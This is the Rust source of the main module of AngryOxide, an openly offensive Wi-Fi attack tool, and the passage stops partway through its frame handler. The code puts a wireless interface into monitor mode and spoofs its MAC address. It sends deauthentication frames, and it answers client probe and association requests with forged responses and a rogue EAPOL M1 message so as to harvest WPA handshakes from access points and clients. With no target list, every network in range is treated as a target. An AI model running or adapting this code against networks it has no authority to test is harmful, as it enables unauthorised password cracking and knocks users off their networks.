mod ascii;
mod attack;
mod auth;
mod database;
mod devices;
mod eventhandler;
mod gps;
mod pcapng;
mod rawsocks;
mod snowstorm;
mod status;
mod tabbedblock;
mod tx;
mod ui;
mod util;

extern crate libc;
extern crate nix;

use anyhow::Result;
use attack::{
    anon_reassociation_attack, deauth_attack, m1_retrieval_attack, m1_retrieval_attack_phase_2,
    rogue_m2_attack_directed, rogue_m2_attack_undirected,
};

use chrono::Local;
use crossterm::event::{
    poll, DisableMouseCapture, EnableMouseCapture, Event, KeyCode, KeyEventKind, KeyModifiers,
    MouseEventKind,
};
use crossterm::terminal::{
    disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen,
};
use database::DatabaseWriter;
use gps::GPSDSource;
use itertools::{Either, Itertools};
use libc::EXIT_FAILURE;
use libwifi::frame::components::{MacAddress, RsnAkmSuite, RsnCipherSuite, WpaAkmSuite};
use libwifi::frame::{DataFrame, EapolKey, NullDataFrame};
use nix::unistd::geteuid;

use nl80211_ng::channels::WiFiChannel;
use nl80211_ng::{
    get_interface_info_name, set_interface_chan, set_interface_down, set_interface_mac,
    set_interface_monitor, set_interface_station, set_interface_up, Interface, Nl80211,
};

use flate2::write::GzEncoder;
use flate2::Compression;

use pcapng::{FrameData, PcapWriter};
use radiotap::field::{AntennaSignal, Field};
use radiotap::Radiotap;
use rand::{thread_rng, Rng};
use ratatui::backend::CrosstermBackend;
use ratatui::layout::Rect;
use ratatui::widgets::TableState;
use ratatui::Terminal;
use rawsocks::{open_socket_rx, open_socket_tx};
use tar::{Builder, Header};
use tx::{
    build_association_response, build_authentication_response, build_cts,
    build_disassocation_from_client, build_eapol_m1, build_probe_request_directed,
    build_probe_request_target, build_probe_request_undirected,
};
use ui::UiState;
use uuid::Uuid;

use crate::ascii::get_art;
use crate::auth::HandshakeStorage;
use crate::devices::{APFlags, AccessPoint, Station, WiFiDeviceList};
use crate::eventhandler::{EventHandler, EventType};
use crate::snowstorm::Snowstorm;
use crate::status::*;
use crate::ui::{print_ui, MenuType};
use crate::util::parse_ip_address_port;

use libwifi::{Addresses, Frame};

use crossterm::{cursor::Hide, cursor::Show, execute};

use std::collections::HashMap;
use std::fs::{self, File};
use std::io;
use std::io::stdout;
use std::io::Write;
use std::os::fd::{AsRawFd, OwnedFd};
use std::process::exit;
use std::str::FromStr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant, SystemTime};

use clap::Parser;

#[derive(Parser)]
#[command(name = "AngryOxide")]
#[command(author = "Ryan Butler (Ragnt)")]
#[command(about = "Does awesome things... with wifi.", long_about = None)]
struct Arguments {
    #[arg(short, long)]
    /// Interface to use.
    interface: String,
    #[arg(short, long)]
    /// Optional channel to scan. Will use "-c 1 -c 6 -c 11" if excluded.
    channel: Vec<u8>,
    #[arg(short, long)]
    /// Optional band to scan - Will include all channels interface can support.
    band: Vec<u8>,
    #[arg(short, long)]
    /// Optional list of targets to attack - will attack everything if excluded.
    target: Option<Vec<String>>,
    #[arg(short, long)]
    /// Optional output filename.
    output: Option<String>,
    #[arg(short, long)]
    /// Optional TX MAC for rogue-based attacks - will randomize if excluded.
    rogue: Option<String>,
    #[arg(long, default_value = "127.0.0.1:2947")]
    /// Optional alter default HOST:Port for GPSD connection.
    gpsd: String,
    #[arg(long)]
    /// Optional set the tool to headless mode without a UI.
    headless: bool,
    #[arg(long)]
    /// Optional tool will auto-exit when all targets have a valid hashline.
    autoexit: bool,
    #[arg(long)]
    /// Optional do not transmit, passive only
    notransmit: bool,
    #[arg(long)]
    /// Optional tar output files.
    notar: bool,
    #[arg(long)]
    /// Optional send deauths.
    deauth: bool,
}

#[derive(Default)]
pub struct Counters {
    pub packet_id: u64,
    pub empty_reads: u64,
    pub empty_reads_rate: u64,
    pub seq1: u16,
    pub seq2: u16,
    pub seq3: u16,
    pub seq4: u16,
    pub prespidx: u8,
    pub beacons: usize,
    pub data: usize,
    pub null_data: usize,
    pub probe_requests: usize,
    pub probe_responses: usize,
    pub control_frames: usize,
    pub authentication: usize,
    pub deauthentication: usize,
    pub association: usize,
    pub reassociation: usize,
}

impl Counters {
    pub fn packet_id(&mut self) -> u64 {
        self.packet_id += 1;
        self.packet_id
    }

    pub fn sequence1(&mut self) -> u16 {
        self.seq1 = if self.seq1 >= 4096 { 1 } else { self.seq1 + 1 };
        self.seq1
    }

    pub fn sequence2(&mut self) -> u16 {
        self.seq2 = if self.seq2 >= 4096 { 1 } else { self.seq2 + 1 };
        self.seq2
    }

    pub fn sequence3(&mut self) -> u16 {
        self.seq3 = if self.seq3 >= 4096 { 1 } else { self.seq3 + 1 };
        self.seq3
    }

    pub fn sequence4(&mut self) -> u16 {
        self.seq4 = if self.seq4 >= 4096 { 1 } else { self.seq4 + 1 };
        self.seq4
    }

    pub fn proberesponseindex(&mut self) -> u8 {
        self.prespidx = if self.prespidx >= 10 {
            0
        } else {
            self.prespidx + 1
        };
        self.prespidx
    }
}

enum UIMode {
    Headless,
    Normal,
}

pub struct OxideRuntime {
    rx_socket: OwnedFd,
    tx_socket: OwnedFd,
    netlink: Nl80211,
    ui_mode: UIMode,
    ui_state: UiState,
    notx: bool,
    deauth: bool,
    targets: Vec<MacAddress>,
    stargets: Vec<String>,
    access_points: WiFiDeviceList<AccessPoint>,
    unassoc_clients: WiFiDeviceList<Station>,
    rogue_client: MacAddress,
    rogue_m1: EapolKey,
    rogue_essids: HashMap<MacAddress, String>,
    handshake_storage: HandshakeStorage,
    frame_count: u64,
    eapol_count: u64,
    error_count: u64,
    interface: Interface,
    interface_uuid: Uuid,
    counters: Counters,
    pcap_file: PcapWriter,
    database: DatabaseWriter,
    gps_source: GPSDSource,
    status_log: status::MessageLog,
    current_channel: WiFiChannel,
    hop_channels: Vec<u8>,
    eventhandler: EventHandler,
}

impl OxideRuntime {
    pub fn new(
        interface_name: String,
        notx: bool,
        rogue: Option<String>,
        targets: Option<Vec<String>>,
        deauth: bool,
        filename: String,
        cli_gpsd: String,
        cli_band: Vec<u8>,
        cli_channels: Vec<u8>,
        cli_headless: bool,
        cli_autoexit: bool,
    ) -> Self {
        println!("Starting AngryOxide... 😈");

        // Setup initial lists / logs
        let access_points = WiFiDeviceList::new();
        let unassoc_clients = WiFiDeviceList::new();
        let handshake_storage = HandshakeStorage::new();
        let mut log = status::MessageLog::new(cli_headless);

        // Get + Setup Interface

        let mut netlink = Nl80211::new().expect("Cannot open Nl80211");

        let iface = if let Some(interface) = netlink
            .get_interfaces()
            .iter()
            .find(|&(_, iface)| iface.name_as_string() == interface_name)
            .map(|(_, iface)| iface.clone())
        {
            interface
        } else {
            println!("{}", get_art("Interface not found"));
            exit(EXIT_FAILURE);
        };

        let idx = iface.index.unwrap();
        let interface_uuid = Uuid::new_v4();
        println!("Interface Summary:");
        println!("{}", iface.pretty_print());

        // Setup Channels //
        let iface_bands: HashMap<u8, Vec<u8>> = iface.get_frequency_list_simple().unwrap();
        let mut hop_channels: Vec<u8> = Vec::new();
        let mut channels = cli_channels;
        let bands = cli_band;
        let mut default_chans = false;

        if bands.is_empty() && channels.is_empty() {
            channels.extend(vec![1, 6, 11]);
            default_chans = true;
        }

        // Add all channels from bands
        for band in &bands {
            let band_chans = if let Some(chans) = iface_bands.get(&band) {
                chans.clone()
            } else {
                println!(
                    "WARNING: Band {} not available for interface {}... ignoring",
                    band,
                    iface.name_as_string()
                );
                vec![]
            };
            hop_channels.extend(band_chans);
        }

        // Add all individual channels (if valid)

        for channel in &channels {
            if !hop_channels.contains(&channel) {
                if iface_bands.values().any(|bands| bands.contains(&channel)) {
                    hop_channels.push(*channel);
                } else {
                    println!(
                        "WARNING: Channel {} not available for interface {}... ignoring.",
                        channel,
                        iface.name_as_string()
                    );
                }
            }
        }

        // Exit if we tried to provide channels but nothing made it to the hopper.
        if !default_chans && hop_channels.is_empty() {
            println!(
                "{}",
                get_art(&format!(
                    "No channels provided are supported by {}",
                    iface.name_as_string()
                ))
            );
            exit(EXIT_FAILURE);
        }

        println!("Channels: {:?}", hop_channels);

        // Setup targets
        let (target_vec, starget_vec): (Vec<MacAddress>, Vec<String>) =
            if let Some(vec_targets) = targets {
                vec_targets
                    .into_iter()
                    .partition_map(|f| match MacAddress::from_str(&f) {
                        Ok(mac) => Either::Left(mac),
                        Err(_) => Either::Right(f),
                    })
            } else {
                (vec![], vec![])
            };

        if !target_vec.is_empty() {
            let formatted: Vec<String> = target_vec.iter().map(|mac| mac.to_string()).collect();
            let result = formatted.join(", ");
            println!("Target List: {}", result);
            if cli_autoexit {
                println!("Auto-Exit Set - will shutdown when hashline collected for targets.");
            }
        } else {
            println!("No target list provided... everything is a target 😏");
        }

        // Put interface into the right mode
        thread::sleep(Duration::from_secs(1));
        println!("Setting {} down.", interface_name);
        netlink.set_interface_down(idx).ok();
        thread::sleep(Duration::from_millis(500));

        // Setup Rogue Mac's
        let mut rogue_client = MacAddress::random();

        if let Some(rogue) = rogue {
            if let Ok(mac) = MacAddress::from_str(&rogue) {
                println!("Setting {} mac to {} (from rogue)", interface_name, mac);
                rogue_client = mac;
            } else {
                println!(
                    "Invalid rogue supplied - randomizing {} mac to {}",
                    interface_name, rogue_client
                );
            }
        } else {
            println!("Randomizing {} mac to {}", interface_name, rogue_client);
        }
        netlink.set_interface_mac(idx, &rogue_client.0).ok();

        // Put into monitor mode
        thread::sleep(Duration::from_millis(500));
        println!(
            "Setting {} monitor mode. (active {})",
            interface_name,
            iface.phy.clone().unwrap().active_monitor.is_some_and(|x| x)
        );
        netlink
            .set_interface_monitor(
                iface.phy.clone().unwrap().active_monitor.is_some_and(|x| x),
                idx,
            )
            .ok();

        // Set interface up
        thread::sleep(Duration::from_millis(500));
        println!("Setting {} up.", interface_name);
        netlink.set_interface_up(idx).ok();

        // Open sockets
        let rx_socket = open_socket_rx(idx).expect("Failed to open RX Socket.");
        let tx_socket = open_socket_tx(idx).expect("Failed to open TX Socket.");
        thread::sleep(Duration::from_millis(500));

        log.add_message(StatusMessage::new(
            MessageType::Info,
            format!(
                "Sockets Opened Rx: {} Tx: {}",
                rx_socket.as_raw_fd(),
                tx_socket.as_raw_fd()
            ),
        ));

        // Setup RogueM1 Data
        let mut rng = thread_rng();
        let key_nonce: [u8; 32] = rng.gen();

        let rogue_m1 = EapolKey {
            protocol_version: 2u8,
            timestamp: SystemTime::now(),
            packet_type: 3u8,
            packet_length: 0u16,
            descriptor_type: 2u8,
            key_information: 138u16,
            key_length: 16u16,
            replay_counter: 1u64,
            key_nonce,
            key_iv: [0u8; 16],
            key_rsc: 0u64,
            key_id: 0u64,
            key_mic: [0u8; 16],
            key_data_length: 0u16,
            key_data: Vec::new(),
        };

        // Setup initial UI State
        let ui_mode = if cli_headless {
            UIMode::Headless
        } else {
            UIMode::Normal
        };

        let state = UiState {
            current_menu: MenuType::AccessPoints,
            paused: false,
            ap_sort: 0,
            ap_state: TableState::new(),
            ap_table_data: access_points.clone(),
            ap_sort_reverse: false,
            cl_sort: 0,
            cl_state: TableState::new(),
            cl_table_data: unassoc_clients.clone(),
            cl_sort_reverse: false,
            hs_sort: 0,
            hs_state: TableState::new(),
            hs_table_data: handshake_storage.clone(),
            hs_sort_reverse: false,
            messages_sort: 0,
            messages_state: TableState::new(),
            messages_table_data: log.get_all_messages(),
            messages_sort_reverse: false,
            snowstorm: Snowstorm::new_rainbow(Rect::new(1, 2, 3, 4)),
        };

        // Setup Filename writing

        let pcap_filename = format!("{}.pcapng", filename);
        let mut pcap_file = PcapWriter::new(&iface, &pcap_filename);
        pcap_file.start();

        // Setup KismetDB Writing
        let kismetdb_filename = format!("{}.kismet", filename);
        let mut database = DatabaseWriter::new(
            &kismetdb_filename,
            interface_uuid.hyphenated().to_string(),
            iface.clone(),
        );
        database.start();

        // Setup GPSD
        let (host, port) = if let Ok((host, port)) = parse_ip_address_port(&cli_gpsd) {
            (host, port)
        } else {
            println!("GPSD argument {} not valid... ignoring.", cli_gpsd);
            parse_ip_address_port("127.0.0.1:2974").unwrap()
        };

        let mut gpsd = GPSDSource::new(host, port);
        gpsd.start();

        // Setup Rogue_ESSID's tracker
        let rogue_essids: HashMap<MacAddress, String> = HashMap::new();

        let mut eventhandler = EventHandler::new();
        if !cli_headless {
            eventhandler.start();
        }

        println!("Cranking up the 4D3D3D3... 🎩");
        thread::sleep(Duration::from_secs(2));

        OxideRuntime {
            rx_socket,
            tx_socket,
            netlink,
            ui_mode,
            ui_state: state,
            notx,
            deauth,
            targets: target_vec,
            stargets: starget_vec,
            frame_count: 0,
            eapol_count: 0,
            error_count: 0,
            handshake_storage,
            access_points,
            unassoc_clients,
            rogue_client,
            rogue_m1,
            rogue_essids,
            interface: iface,
            interface_uuid,
            counters: Counters::default(),
            pcap_file,
            database,
            gps_source: gpsd,
            status_log: log,
            current_channel: WiFiChannel::Channel2GHz(1),
            hop_channels,
            eventhandler,
        }
    }

    fn get_current_menu_len(&self) -> usize {
        match self.ui_state.current_menu {
            MenuType::AccessPoints => self.access_points.size(),
            MenuType::Clients => self.unassoc_clients.size(),
            MenuType::Handshakes => self.handshake_storage.count(),
            MenuType::Messages => self.status_log.size(),
        }
    }

    fn get_target_success(&self) -> bool {
        let mut complete = true;
        if self.targets.is_empty() {
            return false;
        }
        for target in &self.targets {
            if !self.handshake_storage.has_complete_handshake_for_ap(target) {
                complete = false;
            }
        }
        complete
    }
}

fn handle_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
    let radiotap = match Radiotap::from_bytes(packet) {
        Ok(radiotap) => radiotap,
        Err(error) => {
            oxide.error_count += 1;
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Error,
                format!("Couldn't read packet data with Radiotap: {error:?}",),
            ));
            return Err(error.to_string());
        }
    };

    oxide.frame_count += 1;
    let packet_id = oxide.counters.packet_id();

    // Get Channel Values
    let current_channel = oxide.interface.frequency.clone().unwrap().channel.unwrap();
    oxide.current_channel = current_channel.clone();
    let channel_u8: u8 = current_channel.get_channel_number();

    let payload = &packet[radiotap.header.length..];

    let fcs = radiotap.flags.map_or(false, |flags| flags.fcs);
    let gps_data = oxide.gps_source.get_gps();
    let source: MacAddress;
    let destination: MacAddress;

    // Send a probe request out there every 200 beacons.
    if oxide.counters.beacons % 200 == 0 && !oxide.notx {
        let frx = build_probe_request_undirected(&oxide.rogue_client, oxide.counters.sequence2());
        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
    }

    match libwifi::parse_frame(payload, fcs) {
        Ok(frame) => {
            source = *frame.src().unwrap_or(&MacAddress([0, 0, 0, 0, 0, 0]));
            destination = *frame.dest();

            // Pre Processing
            match frame.clone() {
                Frame::Beacon(beacon_frame) => {
                    oxide.counters.beacons += 1;

                    let bssid = beacon_frame.header.address_3;

                    let signal_strength: AntennaSignal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );
                    if bssid.is_real_device() {
                        let station_info = &beacon_frame.station_info;
                        let ssid = station_info
                            .ssid
                            .as_ref()
                            .map(|nssid| nssid.replace('\0', ""));
                        let ap =
                            oxide.access_points.add_or_update_device(
                                bssid,
                                &AccessPoint::new(
                                    bssid,
                                    signal_strength,
                                    ssid.clone(),
                                    station_info.ds_parameter_set,
                                    Some(APFlags {
                                        apie_essid: station_info.ssid.as_ref().map(|_| true),
                                        gs_ccmp: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.group_cipher_suite == RsnCipherSuite::CCMP
                                        }),
                                        gs_tkip: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.group_cipher_suite == RsnCipherSuite::TKIP
                                        }),
                                        cs_ccmp: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.pairwise_cipher_suites
                                                .contains(&RsnCipherSuite::CCMP)
                                        }),
                                        cs_tkip: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.pairwise_cipher_suites
                                                .contains(&RsnCipherSuite::TKIP)
                                        }),
                                        rsn_akm_psk: station_info
                                            .rsn_information
                                            .as_ref()
                                            .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK)),
                                        rsn_akm_psk256: station_info.rsn_information.as_ref().map(
                                            |rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK256),
                                        ),
                                        rsn_akm_pskft: station_info.rsn_information.as_ref().map(
                                            |rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSKFT),
                                        ),
                                        wpa_akm_psk: station_info
                                            .wpa_info
                                            .as_ref()
                                            .map(|wpa| wpa.akm_suites.contains(&WpaAkmSuite::Psk)),
                                        ap_mfp: station_info
                                            .rsn_information
                                            .as_ref()
                                            .map(|rsn| rsn.mfp_required),
                                    }),
                                    oxide.rogue_client,
                                ),
                            );
                        if !oxide.notx {
                            if ap.beacon_count % 200 == 0
                                && !ap.ssid.clone().is_some_and(|ssid| ssid != "")
                            {
                                let frx = build_probe_request_target(
                                    &oxide.rogue_client,
                                    &bssid,
                                    oxide.counters.sequence2(),
                                );
                                let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
                                oxide.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!("Probing Unknown SSID: {}", bssid),
                                ));
                            }
                        }
                        ap.beacon_count += 1;
                    }
                    let _ = m1_retrieval_attack(oxide, &bssid);
                    if oxide.deauth {
                        let _ = deauth_attack(oxide, &bssid);
                    }
                }
                Frame::ProbeRequest(probe_request_frame) => {
                    oxide.counters.probe_requests += 1;

                    let client_mac = probe_request_frame.header.address_2; // MAC address of the client
                    let ap_mac = probe_request_frame.header.address_1; // MAC address of the client
                    let signal_strength = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );
                    let ssid = &probe_request_frame.station_info.ssid;

                    if client_mac.is_real_device() && client_mac != oxide.rogue_client {
                        if !ap_mac.is_broadcast() {
                            // Directed probe request
                            match ssid {
                                Some(ssid) => {
                                    // Add to unassoc clients.
                                    oxide.unassoc_clients.add_or_update_device(
                                        client_mac,
                                        &Station::new_unassoc_station(
                                            client_mac,
                                            signal_strength,
                                            vec![ssid.to_string()],
                                        ),
                                    );
                                }
                                None => {}
                            }
                            // Probe request attack - Begin our RogueM2 attack procedure.
                            rogue_m2_attack_directed(oxide, probe_request_frame)?;
                        } else {
                            // undirected probe request

                            match ssid {
                                None => {
                                    // Add to unassoc clients.
                                    oxide.unassoc_clients.add_or_update_device(
                                        client_mac,
                                        &Station::new_unassoc_station(
                                            client_mac,
                                            signal_strength,
                                            vec![],
                                        ),
                                    );
                                }
                                Some(ssid) => {
                                    // Add to unassoc clients.
                                    oxide.unassoc_clients.add_or_update_device(
                                        client_mac,
                                        &Station::new_unassoc_station(
                                            client_mac,
                                            signal_strength,
                                            vec![ssid.to_string()],
                                        ),
                                    );
                                }
                            }

                            // Probe request attack - Begin our RogueM2 attack procedure.
                            rogue_m2_attack_undirected(oxide, probe_request_frame)?;
                        }
                    }
                }
                Frame::ProbeResponse(probe_response_frame) => {
                    // Assumption:
                    //  Only an AP will send a probe response.
                    //
                    oxide.counters.probe_responses += 1;
                    let bssid = &probe_response_frame.header.address_3;
                    let signal_strength = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );
                    if bssid.is_real_device() {
                        let station_info = &probe_response_frame.station_info;
                        let ssid = station_info
                            .ssid
                            .as_ref()
                            .map(|nssid| nssid.replace('\0', ""));
                        oxide.access_points.add_or_update_device(
                            *bssid,
                            &AccessPoint::new(
                                *bssid,
                                signal_strength,
                                ssid,
                                probe_response_frame.station_info.ds_parameter_set,
                                Some(APFlags {
                                    apie_essid: station_info.ssid.as_ref().map(|_| true),
                                    gs_ccmp: station_info
                                        .rsn_information
                                        .as_ref()
                                        .map(|rsn| rsn.group_cipher_suite == RsnCipherSuite::CCMP),
                                    gs_tkip: station_info
                                        .rsn_information
                                        .as_ref()
                                        .map(|rsn| rsn.group_cipher_suite == RsnCipherSuite::TKIP),
                                    cs_ccmp: station_info.rsn_information.as_ref().map(|rsn| {
                                        rsn.pairwise_cipher_suites.contains(&RsnCipherSuite::CCMP)
                                    }),
                                    cs_tkip: station_info.rsn_information.as_ref().map(|rsn| {
                                        rsn.pairwise_cipher_suites.contains(&RsnCipherSuite::TKIP)
                                    }),
                                    rsn_akm_psk: station_info
                                        .rsn_information
                                        .as_ref()
                                        .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK)),
                                    rsn_akm_psk256: station_info
                                        .rsn_information
                                        .as_ref()
                                        .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK256)),
                                    rsn_akm_pskft: station_info
                                        .rsn_information
                                        .as_ref()
                                        .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSKFT)),
                                    wpa_akm_psk: station_info
                                        .wpa_info
                                        .as_ref()
                                        .map(|wpa| wpa.akm_suites.contains(&WpaAkmSuite::Psk)),
                                    ap_mfp: station_info
                                        .rsn_information
                                        .as_ref()
                                        .map(|rsn| rsn.mfp_required),
                                }),
                                oxide.rogue_client,
                            ),
                        );
                        let _ = m1_retrieval_attack(oxide, bssid);
                    };
                }
                Frame::Authentication(auth_frame) => {
                    oxide.counters.authentication += 1;

                    // Assumption:
                    //  Authentication packets can be sent by the AP or Client.
                    //  We will use the sequence number to decipher.

                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if auth_frame.auth_algorithm == 0 {
                        // Open system (Which can be open or WPA2)
                        if auth_frame.auth_seq == 1 {
                            // From Client
                            let client = auth_frame.header.address_2;
                            let ap_addr = auth_frame.header.address_1;
                            let bssid = auth_frame.header.address_3;

                            // First let's add it to our unassociated clients list:
                            oxide.unassoc_clients.add_or_update_device(
                                client,
                                &Station::new_unassoc_station(client, signal, vec![]),
                            );

                            if ap_addr == oxide.rogue_client {
                                // We need to send an auth back
                                let frx = build_authentication_response(
                                    &client,
                                    &ap_addr,
                                    &ap_addr,
                                    oxide.counters.sequence3(),
                                );
                                write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
                            }
                        } else if auth_frame.auth_seq == 2 {
                            //// From AP
                            let client = auth_frame.header.address_1;
                            let ap_addr = auth_frame.header.address_2;

                            // Add AP
                            oxide.access_points.add_or_update_device(
                                ap_addr,
                                &AccessPoint::new(
                                    ap_addr,
                                    signal,
                                    None,
                                    Some(current_channel.get_channel_number()),
                                    None,
                                    oxide.rogue_client,
                                ),
                            );

                            if client != oxide.rogue_client {
                                // If it's not our rogue client that it's responding to.
                                oxide.unassoc_clients.add_or_update_device(
                                    client,
                                    &Station::new_unassoc_station(
                                        client,
                                        AntennaSignal::from_bytes(&[0u8])
                                            .map_err(|err| err.to_string())?,
                                        vec![],
                                    ),
                                );
                            } else {
                                let _ = m1_retrieval_attack_phase_2(
                                    &ap_addr,
                                    &oxide.rogue_client.clone(),
                                    oxide,
                                );
                            }
                        }
                    }
                }
                Frame::Deauthentication(deauth_frame) => {
                    oxide.counters.deauthentication += 1;

                    // Assumption:
                    //  Deauthentication packets can be sent by the AP or Client.
                    //
                    let from_ds: bool = deauth_frame.header.frame_control.from_ds();
                    let to_ds: bool = deauth_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        deauth_frame.header.address_2
                    } else if !from_ds && to_ds {
                        deauth_frame.header.address_1
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        deauth_frame.header.address_2
                    } else {
                        deauth_frame.header.address_1
                    };

                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    // Add AP
                    if ap_addr.is_real_device() {
                        oxide.access_points.add_or_update_device(
                            ap_addr,
                            &AccessPoint::new(
                                ap_addr,
                                if from_ds {
                                    signal
                                } else {
                                    AntennaSignal::from_bytes(&[0u8])
                                        .map_err(|err| err.to_string())?
                                },
                                None,
                                None,
                                None,
                                oxide.rogue_client,
                            ),
                        );
                    }

                    // If client sends deauth... we should probably treat as unassoc?
                    if station_addr.is_real_device() && station_addr != oxide.rogue_client {
                        oxide.unassoc_clients.add_or_update_device(
                            station_addr,
                            &Station::new_unassoc_station(
                                station_addr,
                                if to_ds {
                                    signal
                                } else {
                                    AntennaSignal::from_bytes(&[0u8])
                                        .map_err(|err| err.to_string())?
                                },
                                vec![],
                            ),
                        );
                    }
                }
                Frame::Action(frame) => {
                    let from_ds: bool = frame.header.frame_control.from_ds();
                    let to_ds: bool = frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        frame.header.address_2
                    } else if !from_ds && to_ds {
                        frame.header.address_1
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        frame.header.address_2
                    } else {
                        frame.header.address_1
                    };

                    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if station_addr.is_real_device() && station_addr != oxide.rogue_client {
                        // Make sure this isn't a broadcast or rogue

                        let client = &Station::new_station(
                            station_addr,
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                            },
                            Some(ap_addr),
                        );
                        clients.add_or_update_device(station_addr, client);
                        oxide.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = AccessPoint::new_with_clients(
                        ap_addr,
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                        },
                        None,
                        Some(channel_u8),
                        None,
                        clients,
                        oxide.rogue_client,
                    );
                    oxide.access_points.add_or_update_device(ap_addr, &ap);
                }
                Frame::AssociationRequest(assoc_request_frame) => {
                    oxide.counters.association += 1;

                    // Assumption:
                    //  Only a client/potential client will ever submit an association request.
                    //  This is how we will know to send a fake M1 and try to get an M2 from it.

                    let client_mac = assoc_request_frame.header.address_2; // MAC address of the client
                    let ap_mac = assoc_request_frame.header.address_1; // MAC address of the AP.
                    let ssid = assoc_request_frame.station_info.ssid;

                    // Handle client as not yet associated
                    if client_mac.is_real_device() && client_mac != oxide.rogue_client {
                        oxide.unassoc_clients.add_or_update_device(
                            client_mac,
                            &Station::new_unassoc_station(
                                client_mac,
                                radiotap.antenna_signal.unwrap_or(
                                    AntennaSignal::from_bytes(&[0u8])
                                        .map_err(|err| err.to_string())?,
                                ),
                                vec![],
                            ),
                        );
                    };
                    // Add AP
                    if ap_mac.is_real_device() {
                        let ap = AccessPoint::new(
                            ap_mac,
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            None,
                            Some(channel_u8),
                            None,
                            oxide.rogue_client,
                        );
                        oxide.access_points.add_or_update_device(ap_mac, &ap);
                    };

                    if ap_mac == oxide.rogue_client {
                        let rogue_ssid = ssid.unwrap_or("".to_string());
                        // We need to send an association response back
                        let frx = build_association_response(
                            &client_mac,
                            &ap_mac,
                            &ap_mac,
                            oxide.counters.sequence3(),
                            &rogue_ssid,
                        );
                        write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
                        // Then an M1
                        let m1: Vec<u8> = build_eapol_m1(
                            &client_mac,
                            &ap_mac,
                            &ap_mac,
                            oxide.counters.sequence3(),
                            &oxide.rogue_m1,
                        );
                        oxide.rogue_essids.insert(client_mac, rogue_ssid);
                        write_packet(oxide.tx_socket.as_raw_fd(), &m1)?;
                    }
                }
                Frame::AssociationResponse(assoc_response_frame) => {
                    oxide.counters.association += 1;

                    // Assumption:
                    //  Only a AP will ever submit an association response.
                    //
                    let client_mac = assoc_response_frame.header.address_1; // MAC address of the client
                    let bssid = assoc_response_frame.header.address_2; // MAC address of the AP (BSSID)

                    if bssid.is_real_device()
                        && client_mac.is_real_device()
                        && client_mac != oxide.rogue_client
                    {
                        // Valid devices
                        let mut clients = WiFiDeviceList::<Station>::new();

                        if assoc_response_frame.status_code != 0 {
                            // Association was successful
                            let client = &Station::new_station(
                                client_mac,
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                                Some(bssid),
                            );
                            clients.add_or_update_device(client_mac, client);
                            oxide.unassoc_clients.remove_device(&client_mac);
                        }
                        let station_info = &assoc_response_frame.station_info;
                        let ap = AccessPoint::new_with_clients(
                            bssid,
                            radiotap.antenna_signal.unwrap_or(
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ),
                            None,
                            Some(channel_u8),
                            Some(APFlags {
                                apie_essid: station_info.ssid.as_ref().map(|_| true),
                                gs_ccmp: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.group_cipher_suite == RsnCipherSuite::CCMP),
                                gs_tkip: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.group_cipher_suite == RsnCipherSuite::TKIP),
                                cs_ccmp: station_info.rsn_information.as_ref().map(|rsn| {
                                    rsn.pairwise_cipher_suites.contains(&RsnCipherSuite::CCMP)
                                }),
                                cs_tkip: station_info.rsn_information.as_ref().map(|rsn| {
                                    rsn.pairwise_cipher_suites.contains(&RsnCipherSuite::TKIP)
                                }),
                                rsn_akm_psk: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK)),
                                rsn_akm_psk256: station_info
